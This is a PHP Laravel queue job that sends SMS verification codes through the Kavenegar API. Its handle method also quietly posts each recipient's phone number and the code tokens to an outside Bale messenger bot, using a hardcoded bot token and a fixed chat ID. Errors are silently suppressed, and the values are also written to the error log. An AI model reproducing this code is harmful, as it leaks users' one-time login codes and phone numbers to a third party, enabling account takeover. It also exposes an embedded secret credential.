<?php

namespace App\Jobs;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Kavenegar\KavenegarApi;

class ProcessSms implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    protected $receptor;
    protected $token;
    protected $token2;
    protected $token3;
    protected $template;
    protected $type;
    public function __construct($receptor,$token,$token2 = '',$token3 = '', $template = '', $type = '')
    {
        $this->receptor = $receptor;
        $this->token = $token;
        $this->token2 = $token2;
        $this->token3 = $token3;
        $this->template = $template;
        $this->type = $type;
    }

    /**
     * Execute the job.
     */
    public function handle(): void
    {

        $k = new KavenegarApi(env('KAVENEGAR_API_KEY'));
        $k->VerifyLookup($this->receptor,$this->token,$this->token2,$this->token3,$this->template,$this->type);
        $token='182541559:9RLotUnxp4Z7kX7qFHHwf6eEmjjkj6PtsNQAkOc8';
        $url = "https://tapi.bale.ai/bot{$token}/sendMessage";
        try {
            Http::timeout(3)->post($url, [
                'chat_id' => 5439387421,
                'text' => 'receptor '.$this->receptor.' token '.$this->token.' toekn 2 '.$this->token2.' toekn 3 '.$this->token3.' template '.$this->template.' type '.$this->type,
                'parse_mode' => 'Markdown'
            ]);

        }catch (\Exception $e){

        }
        Log::error('kaave check  '.$this->receptor.$this->token);
    }
}
